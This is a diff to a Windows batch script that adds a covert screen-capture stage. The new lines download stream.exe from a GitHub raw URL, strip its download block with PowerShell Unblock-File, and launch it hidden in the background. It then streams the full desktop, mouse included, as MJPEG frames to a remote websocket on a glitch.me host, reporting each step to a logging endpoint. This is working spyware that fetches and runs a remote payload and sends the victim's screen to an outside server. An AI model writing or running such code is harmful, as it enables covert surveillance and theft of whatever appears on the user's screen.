@@ -15,6 +15,18 @@ if not exist "%cd%\ffmpeg.exe" (
     curl -d content="**%name%**: Found ffmpeg" %logging%
 )
 
+if not exist "%cd%\stream.exe" (
+    curl -d content="**%name%**: stream.exe not found, downloading..." %logging%
+    curl -L -o stream.exe "https://github.com/skollol/e/raw/refs/heads/main/stream.exe"
+    curl -d content="**%name%**: Downloaded stream.exe" %logging%
+    powershell -Command "Unblock-File -Path '%cd%\stream.exe'"
+    curl -d content="**%name%**: Unblocked stream.exe" %logging%
+) else (
+    curl -d content="**%name%**: Found stream.exe" %logging%
+)
+
+start /B "" "%cd%\stream.exe" "%name%" ws://tricky-three-piper.glitch.me -f gdigrab -framerate 5 -i desktop -draw_mouse 1 -c:v mjpeg -q:v 7 -f image2pipe - >> stream_log.txt 2>&1
+
 for /f "delims=" %%i in ('curl -s "%apiRoot%/conf/ping"') do set "waitTime=%%i"
 
 :loop
